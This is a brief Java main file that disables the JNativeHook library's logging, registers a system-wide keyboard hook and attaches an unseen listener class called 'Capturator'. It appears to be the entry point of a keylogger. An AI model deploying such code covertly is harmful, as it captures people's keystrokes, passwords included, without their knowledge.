package Dime;

import java.util.logging.Logger;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyListener;



public class Main {
	
	public static void main(String[] args) {
		Logger log= Logger.getLogger(GlobalScreen.class.getPackage().getName());
		
		log.setLevel(Level.OFF);
		try {
			GlobalScreen.registerNativeHook();
		}catch (Exception e) {

		}

		GlobalScreen.addNativeKeyListener((NativeKeyListener) new Capturator());
	}
}
